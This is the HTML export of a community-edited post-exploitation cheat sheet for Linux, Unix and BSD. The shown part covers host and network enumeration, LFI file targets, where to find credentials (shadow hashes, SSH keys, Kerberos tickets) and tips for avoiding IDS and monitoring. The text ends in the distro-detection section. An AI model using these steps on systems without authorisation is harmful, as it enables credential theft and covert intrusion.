<html><head><title>Linux/Unix/BSD Post-Exploitation Command List</title><style type="text/css">ol{margin:0;padding:0}.c13{vertical-align:top;width:108.5pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c24{vertical-align:top;width:250.9pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c42{vertical-align:top;width:254.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c30{vertical-align:top;width:382.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c31{vertical-align:top;width:248.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c20{vertical-align:top;width:224.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c4{vertical-align:top;width:279.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c39{vertical-align:top;width:266pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c8{vertical-align:top;width:255.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c22{vertical-align:top;width:249pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c43{vertical-align:top;width:253.1pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c6{vertical-align:top;width:238pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c29{list-style-type:circle;margin:0;padding:0}.c52{max-width:504pt;background-color:#ffffff;padding:54pt 54pt 54pt 54pt}.c7{list-style-type:disc;margin:0;padding:0}.c1{padding-left:0pt;direction:ltr;margin-left:36pt}.c38{color:#333333;font-size:8pt;font-family:"Courier New"}.c16{font-size:24pt;background-color:#ffffff}.c25{padding-left:0pt;margin-left:72pt}.c15{margin:5px;border:1px solid black}.c26{color:#000099;text-decoration:underline}.c19{color:inherit;text-decoration:inherit}.c0{color:#1155cc;text-decoration:underline}.c40{color:#222222;background-color:#f7f7f7}.c2{direction:ltr;margin-left:18pt}.c33{font-size:14pt;background-color:#ffffff}.c27{margin-right:13pt;text-align:center}.c18{padding-top:0pt;padding-bottom:0pt}.c46{color:#ff0000}.c41{text-indent:36pt}.c14{font-style:italic}.c49{height:208pt}.c55{font-size:9pt}.c47{font-size:18pt}.c17{margin-left:36pt}.c34{text-align:center}.c56{vertical-align:sub}.c48{background-color:#ffff00}.c32{height:0pt}.c28{height:28pt}.c12{font-weight:bold}.c11{line-height:1.0}.c54{margin-left:144pt}.c37{margin-right:13pt}.c44{height:72pt}.c21{height:27pt}.c50{height:64pt}.c23{height:25pt}.c5{direction:ltr}.c51{text-align:right}.c53{text-align:justify}.c3{height:11pt}.c9{border-collapse:collapse}.c45{margin-left:108pt}.c35{height:24pt}.c10{height:18pt}.c36{font-size:10pt}.title{padding-top:24pt;line-height:1.15;text-align:left;color:#000000;font-size:36pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}.subtitle{padding-top:18pt;line-height:1.15;text-align:left;color:#666666;font-style:italic;font-size:24pt;font-family:"Georgia";padding-bottom:4pt}li{color:#000000;font-size:11pt;font-family:"Arial"}p{color:#000000;font-size:11pt;margin:0;font-family:"Arial"}h1{padding-top:24pt;line-height:1.15;text-align:left;color:#000000;font-size:24pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}h2{padding-top:18pt;line-height:1.15;text-align:left;color:#000000;font-size:18pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h3{padding-top:14pt;line-height:1.15;text-align:left;color:#000000;font-size:14pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h4{padding-top:12pt;line-height:1.15;text-align:left;color:#000000;font-size:12pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h5{padding-top:11pt;line-height:1.15;text-align:left;color:#000000;font-size:11pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h6{padding-top:10pt;line-height:1.15;text-align:left;color:#000000;font-size:10pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}</style></head><body class="c52"><p class="c5 c3 c37"><span></span></p><p class="c37 c5"><span>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class="c5 c27"><span>&nbsp;</span></p><p class="c34 c5"><span class="c12 c16">Linux/Unix/BSD Post-Exploitation</span></p><p class="c34 c5"><span class="c16 c12">Command List</span></p><p class="c34 c5"><span class="c33">If for any reason you cannot access/edit these files in the future, please contact</span></p><p class="c5 c34"><span class="c26 c33">mubix@hak5.org</span></p><p class="c34 c5"><span class="c33">You can download these files in any format using Google &nbsp; Doc&rsquo;s</span></p><p class="c34 c5"><span class="c33">File-&gt;Download As method</span></p><p class="c34 c5"><span class="c33">If you are viewing this on anything other than Google Docs, you can get</span></p><p class="c34 c5"><span class="c33">access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and</span></p><p class="c34 c5"><span class="c33">Windows docs here: </span><span class="c0"><a class="c19" href="http://bit.ly/nuc0N0">http://bit.ly/nuc0N0</a></span></p><p class="c34 c5 c3"><span class="c26 c33"></span></p><p class="c5"><span class="c33 c46">DISCLAIMER: Anyone can edit these docs, and all that entails and implies</span></p><h1 class="c5 c35"><a name="h.mx1x5qjsjgfb"></a></h1><h1 class="c5 c35"><a name="h.2lhr89mzy4k"></a></h1><hr style="page-break-before:always;display:none;"><h1 class="c5 c35"><a name="h.cxojhdotqlvz"></a></h1><h1 class="c5"><a name="h.hy4q6drqtn2v"></a><span>Ta</span><span>ble of Contents</span></h1><p class="c5 c3"><span class="c26"></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.hy4q6drqtn2v">Table of Contents</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.msosz9bb7mrp">Information</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.q9d1ls3sym4f">Blind Files</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.afie1ige7mcs">System</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.erk5s2w47lm">Networking</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.x9b8s2isspqw">User accounts</a></span></p><p class="c5 c17"><span class="c0"><a class="c19" href="#h.58rwlvv8xrws">Credentials</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.jelcvocepqcs">Configs</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.rop5dynnaw1r">Determine Distro</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.u3q03osix6gd">Installed Packages</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.fapd4nugyr42">Package Sources</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.s5cidyjukhu9">Finding Important Files</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.54mlnuvovzfr">Covering Your Tracks</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.vzdepznkca6s">Avoiding history filesmys</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.gujnz588ipum">Obtain users&rsquo; information</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.q15hrwe7gcze">Escalating</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.wrbsvpym06p8">Looking for possible opened paths</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.dkwcpqk6tonc">Maintaining control</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.q5twgc79wzow">Reverse Shell</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.hnb7rgxpzqnt">Fun if Windows is present and accessible</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.199tyc28x3ns">Stuff to be sorted</a></span></p><p class="c2"><span class="c0"><a class="c19" href="#h.jq00y779et7r">Deleting and Destroying</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.jj5mr9w034hc">Execute a remote script</a></span></p><p class="c17 c5"><span class="c0"><a class="c19" href="#h.hisythb6094c">Fork Bomb</a></span></p><p class="c5 c3"><span class="c26"></span></p><hr style="page-break-before:always;display:none;"><p class="c5 c3"><span class="c26"></span></p><h1 class="c5"><a name="h.msosz9bb7mrp"></a><span>Information</span></h1><p class="c5 c3"><span></span></p><h2 class="c5"><a name="h.q9d1ls3sym4f"></a><span>Blind Files</span></h2><p class="c5"><span>(things to pull when all you can do is blindly read) LFI/dir traversal (Don&rsquo;t forget %00!)</span></p><p class="c5 c3"><span></span></p><a href="#" name="cb151ee4031bbe64f0ea740c5e4559b0ef92cb6e"></a><a href="#" name="0"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c22"><p class="c5"><span class="c12">File</span></p></td><td class="c42"><p class="c5"><span class="c12">Contents and Reason</span></p></td></tr><tr class="c50"><td class="c22"><p class="c5"><span>/etc/resolv.conf</span></p><p class="c5 c3"><span></span></p><p class="c5"><span>&nbsp;</span></p></td><td class="c42"><p class="c5"><span>Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd</span></p></td></tr><tr><td class="c22"><p class="c5"><span>/etc/motd</span></p></td><td class="c42"><p class="c5"><span>Message of the Day. </span></p></td></tr><tr><td class="c22"><p class="c5"><span>/etc/issue</span></p></td><td class="c42"><p class="c5"><span>Debian - current version of distro</span></p></td></tr><tr class="c21"><td class="c22"><p class="c5"><span>/etc/passwd</span></p></td><td class="c42"><p class="c5"><span>List of local users </span></p></td></tr><tr class="c32"><td class="c22"><p class="c5"><span>/etc/shadow</span></p></td><td class="c42"><p class="c5"><span>List of users&rsquo; passwords&rsquo; hashes (requires root)</span></p></td></tr><tr><td class="c22"><p class="c11 c5"><span>/home/xxx/.bash_history</span></p></td><td class="c42"><p class="c11 c5"><span>Will give you some directory context</span></p></td></tr></tbody></table><h2 class="c5"><a name="h.afie1ige7mcs"></a><span>System</span></h2><a href="#" name="21aa789ad8f40576b6497d19e8fa2180b4a900cb"></a><a href="#" name="1"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c20"><p class="c5"><span class="c12">Command</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c4"><p class="c5"><span class="c12">Description and/or Reason</span></p></td></tr><tr class="c28"><td class="c20"><p class="c5"><span>uname -a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c4"><p class="c5"><span>Prints the kernel version, arch, sometimes distro, ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr class="c28"><td class="c20"><p class="c5"><span>ps aux</span></p></td><td class="c4"><p class="c5"><span>List all running processes</span></p></td></tr><tr class="c44"><td class="c20"><p class="c5"><span>top -n 1 -d</span></p></td><td class="c4"><p class="c5"><span>Print process, 1 is a number of lines</span></p></td></tr><tr class="c32"><td class="c20"><p class="c5"><span>id</span></p></td><td class="c4"><p class="c5"><span>Your current username, groups</span></p></td></tr><tr><td class="c20"><p class="c5"><span>arch, uname -m</span></p></td><td class="c4"><p class="c5"><span>Kernel processor architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>w</span></p></td><td class="c4"><p class="c5"><span>who is connected, uptime and load avg</span></p></td></tr><tr><td class="c20"><p class="c5"><span>who -a</span></p></td><td class="c4"><p class="c5"><span>uptime, runlevel, tty, proceses etc.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr class="c23"><td class="c20"><p class="c5"><span>gcc -v</span></p></td><td class="c4"><p class="c5"><span>Returns the version of GCC.</span></p></td></tr><tr><td class="c20"><p class="c5"><span>mysql --version</span></p></td><td class="c4"><p class="c5"><span>Returns the version of MySQL.</span></p></td></tr><tr><td class="c20"><p class="c5"><span>perl -v</span></p></td><td class="c4"><p class="c5"><span>Returns the version of Perl.</span></p></td></tr><tr><td class="c20"><p class="c5"><span>ruby -v</span></p></td><td class="c4"><p class="c5"><span>Returns the version of Ruby.</span></p></td></tr><tr><td class="c20"><p class="c5"><span>python --version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c4"><p class="c5"><span>Returns the version of Python.</span></p></td></tr><tr class="c32"><td class="c20"><p class="c5"><span>df -k</span></p></td><td class="c4"><p class="c5"><span>mounted fs, size, % use, dev and mount point[</span></p></td></tr><tr><td class="c20"><p class="c5"><span>mount</span></p></td><td class="c4"><p class="c5"><span>mounted fs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>last -a</span></p></td><td class="c4"><p class="c5"><span>Last users logged on</span></p></td></tr><tr><td class="c20"><p class="c5"><span>lastcomm</span></p></td><td class="c4"><p class="c5"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>lastlog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c4"><p class="c5"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>lastlogin (BSD)</span></p></td><td class="c4"><p class="c5"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>getenforce</span></p></td><td class="c4"><p class="c5"><span>Get the status of SELinux (Enforcing, Permissive or Disabled)</span></p></td></tr><tr><td class="c20"><p class="c5"><span>dmesg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c4"><p class="c5"><span>Informations from the last system boot</span></p></td></tr><tr><td class="c20"><p class="c5"><span>lspci</span></p></td><td class="c4"><p class="c5"><span>prints all PCI buses and devices</span></p></td></tr><tr><td class="c20"><p class="c5"><span>lsusb</span></p></td><td class="c4"><p class="c5"><span>prints all USB buses and devices/h</span></p></td></tr><tr><td class="c20"><p class="c11 c5"><span>lscpu</span></p></td><td class="c4"><p class="c11 c5"><span>prints CPU information</span></p></td></tr><tr class="c35"><td class="c20"><p class="c5"><span>lshw</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr><td class="c20"><p class="c5"><span>ex</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr class="c23"><td class="c20"><p class="c5"><span>cat /proc/cpuinfo</span></p></td><td class="c4"><p class="c5"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c20"><p class="c5"><span>cat /proc/meminfo</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr class="c10"><td class="c20"><p class="c5"><span>du -h --max-depth=1 /</span></p></td><td class="c4"><p class="c5"><span>(note: can cause heavy disk i/o)</span></p></td></tr><tr><td class="c20"><p class="c5"><span>which nmap</span></p></td><td class="c4"><p class="c5"><span>locate a command (ie nmap or nc)</span></p></td></tr><tr><td class="c20"><p class="c5 c3"><span></span></p><p class="c5"><span>locate bin/nmap</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr><td class="c20"><p class="c5"><span>locate bin/nc</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr><td class="c20"><p class="c5"><span>jps -l</span></p></td><td class="c4"><p class="c5 c3"><span></span></p></td></tr><tr><td class="c20"><p class="c5"><span>java -version</span></p></td><td class="c4"><p class="c5"><span>Returns the version of Java.</span></p></td></tr></tbody></table><h2 class="c5 c10"><a name="h.tu43w01pags6"></a></h2><h2 class="c5 c10"><a name="h.rbz0lz44stb"></a></h2><h2 class="c5"><a name="h.erk5s2w47lm"></a><span>Networking</span></h2><ol class="c7" start="1"><li class="c1"><span>hostname -f</span></li><li class="c1"><span>ip addr show</span></li><li class="c1"><span>ip ro show</span></li><li class="c1"><span>ifconfig -a</span></li><li class="c1"><span>route -n</span></li><li class="c1"><span>cat /etc/network/interfaces</span></li><li class="c1"><span>iptables -L -n -v</span></li><li class="c1"><span>iptables -t nat -L -n -v</span></li><li class="c1"><span>ip6tables -L -n -v</span></li><li class="c1"><span>iptables-save</span></li><li class="c1"><span>netstat -anop</span></li><li class="c1"><span>netstat -r</span></li><li class="c1"><span>netstat -nltupw (root with raw sockets)</span></li><li class="c1"><span>arp -a</span></li><li class="c1"><span>lsof -nPi</span></li></ol><p class="c5"><span>to resume it &rarr; &ldquo;cat /proc/net/*&rdquo; (more discreet)</span></p><p class="c5"><span class="c14 c48">what does the above mean?</span><span class="c14">&nbsp;-&gt; It means that all the information given by the above commands can be found by looking into the files under /proc/net , and that this approach is less likely to trigger monitoring or other stuff.</span></p><h2 class="c5"><a name="h.x9b8s2isspqw"></a><span>User accounts</span></h2><ol class="c7" start="1"><li class="c1"><span>local accounts: </span><span class="c12">cat /etc/passwd</span></li></ol><ol class="c29" start="1"><li class="c25 c5"><span>password hashes in </span><span class="c12">/etc/shadow</span><span>&nbsp;on Linux</span></li><li class="c25 c5"><span>password hashes in /etc/security/passwd on AIX</span></li><li class="c25 c5"><span>groups in </span><span class="c12">/etc/group</span><span>&nbsp;(and/or </span><span class="c12">/etc/gshadow</span><span>&nbsp;on Linux)</span></li></ol><ol class="c7" start="2"><li class="c1"><span>all accounts: </span><span class="c12">getent passwd</span></li></ol><ol class="c29" start="1"><li class="c25 c5"><span>should dump local, LDAP, NIS, whatever the system is using</span></li><li class="c25 c5"><span>same with </span><span class="c12">getent group</span></li></ol><ol class="c7" start="3"><li class="c1"><span>Samba&rsquo;s own database: </span><span class="c12">pdbedit -L -w</span><span>&nbsp;or </span><span class="c12">pdbedit -L -v</span></li><li class="c1"><span>privileged accounts: </span><span class="c12">cat &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li></ol><ol class="c29" start="1"><li class="c5 c25"><span class="c14">(above: cat ???)</span></li></ol><ol class="c7" start="5"><li class="c1"><span>mail aliases: </span><span class="c12">cat /etc/aliases</span><span>&nbsp;</span><span class="c12">find /etc -name aliases</span><span>, </span><span class="c12">getent aliases </span></li><li class="c1"><span>NIS accounts: </span><span class="c12">ypcat passwd </span><span>- displays NIS password file<br></span></li></ol><h2 class="c5"><a name="h.58rwlvv8xrws"></a><span>Credentials</span></h2><ol class="c7" start="1"><li class="c1"><span>SSH keys, often passwordless: </span><span class="c12">/home/*/.ssh/id*</span></li><li class="c1"><span>SSH agent:</span></li><li class="c1 c3"><span></span></li><li class="c1"><span>Kerberos tickets: </span><span class="c12">/tmp/krb5cc_*</span><span>, </span><span class="c12">/tmp/krb5.keytab</span></li><li class="c1"><span>PGP keys: </span><span class="c12">/home/*/.gnupg/secring.gpgs</span><span><br></span></li></ol><h2 class="c5"><a name="h.jelcvocepqcs"></a><span>Configs</span></h2><ol class="c7" start="1"><li class="c1"><span>ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; | grep -v lrwx 2&gt;/dev/nullte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>cat /etc/issue{,.net}</span></li><li class="c1"><span>cat /etc/master.passwd</span></li><li class="c1"><span>cat /etc/group</span></li><li class="c1"><span>cat /etc/hosts</span></li><li class="c1"><span>cat /etc/crontab</span></li><li class="c1"><span>cat </span><span>/etc/sysctl.conf</span></li><li class="c1"><span>for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)</span></li><li class="c1"><span>cat /etc/resolv.conf</span></li><li class="c1"><span>cat /etc/syslog.conf</span></li><li class="c1"><span>cat /etc/chttp.conf</span></li><li class="c1"><span>cat /</span><span>et</span><span>c/lighttpd.conf</span></li><li class="c1"><span>cat /etc/cups/cupsd.confcda</span></li><li class="c1"><span>cat /etc/inetd.conf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>cat /opt/lampp/etc/httpd.conf</span></li><li class="c1"><span>cat /etc/samba/smb.conf</span></li><li class="c1"><span>cat /etc/openldap/ldap.conf</span></li><li class="c1"><span>cat /etc/ldap/ldap.conf</span></li><li class="c1"><span>cat /etc/exports</span></li><li class="c1"><span>cat /etc/auto.master</span></li><li class="c1"><span>cat /etc/auto_master</span></li><li class="c1"><span>cat /etc/fstab</span></li><li class="c1"><span>find /etc/sysconfig/ -type f -exec cat {} \;</span></li></ol><p class="c5 c3"><span></span></p><h2 class="c5"><a name="h.rop5dynnaw1r"></a><span>Determine Distro</span></h2><ol class="c7" start="1"><li class="c1"><span>lsb_release -d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Generic command for all LSB distros</span></li><li class="c1"><span>/etc/os-release&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Generic for distros using &ldquo;systemd&rdquo;</span></li><li class="c1"><span>/etc/issue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Generic but often modified</span></li><li class="c1"><span>cat /etc/*release</span></li><li class="c1"><span>/etc/SUSE-release &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Novell SUSE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>/etc/redhat-release, /etc/redhat_version &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Red Hat</span></li><li class="c1"><span>/etc/fedora-release &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Fedora</span></li><li class="c1"><span>/etc/slackware-release, /etc/slackware-version &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Slackware</span></li><li class="c1"><span>/etc/debian_release, /etc/debian_version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian</span></li><li class="c1"><span>/etc/mandrake-release &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Mandrake</span></li><li class="c1"><span>/etc/sun-release &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Sun JDS</span></li><li class="c1"><span>/etc/release&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Solaris/Sparc</span></li><li class="c1"><span>/etc/gentoo-release &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Gentoo</span></li><li class="c1"><span>/etc/arch-release&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Arch Linux (file will be empty)</span></li><li class="c1"><span>arch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# OpenBSD; sample: &ldquo;OpenBSD.amd64&rdquo;</span></li><li class="c1"><span>uname -a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# often hints at it pretty 